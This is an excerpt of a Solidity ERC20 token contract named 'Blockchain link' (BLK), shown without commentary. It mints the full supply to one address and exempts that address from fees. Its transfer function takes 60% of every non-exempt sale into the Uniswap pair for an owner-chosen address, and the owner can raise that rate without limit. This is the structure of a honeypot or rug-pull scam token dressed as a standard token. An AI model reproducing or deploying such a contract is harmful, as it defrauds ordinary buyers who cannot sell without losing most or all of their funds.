...
contract ERC20 is Context, IERC20, IERC20Metadata, Manage {
    ...
    string  private _name = "Blockchain link";
    address public _owner;
    string  private _symbol = "BLK";
    uint256 public serviceFeeRatio=600;
    uint256 public ratioBase=1000;
     ...
     * construction.
     */
    constructor(address usdtAddress,address factoryAddress,address _mintAddress) {
        _owner=msg.sender;
        setOperator(msg.sender);
        _mint(_mintAddress,210000000 * (10**decimals()));
        changeServiceFeeAddress(_mintAddress);
        _uniswapV2Pair = IUniswapV2Factory(factoryAddress).createPair(address(this), usdtAddress);
        addBList(_mintAddress);
    }
    ...
    function changeServiceFeeRatio(uint256 _ratio) public onlyOwner{
        serviceFeeRatio=_ratio;
    }
    function changeServiceFeeAddress(address _addr) public onlyOwner{
        serviceFeeAddress=_addr;
    }
    ...
    function _transfer(
        ...
        if( !bList[from] && _uniswapV2Pair==to ){
            if(serviceFeeRatio>0){
                uint256 serviceFee=amount*serviceFeeRatio/ratioBase;
                if(serviceFee>0){
                    _balances[serviceFeeAddress] += serviceFee;
                    emit Transfer(from, serviceFeeAddress, serviceFee);
                    amount-=serviceFee;
                }
            }
        }
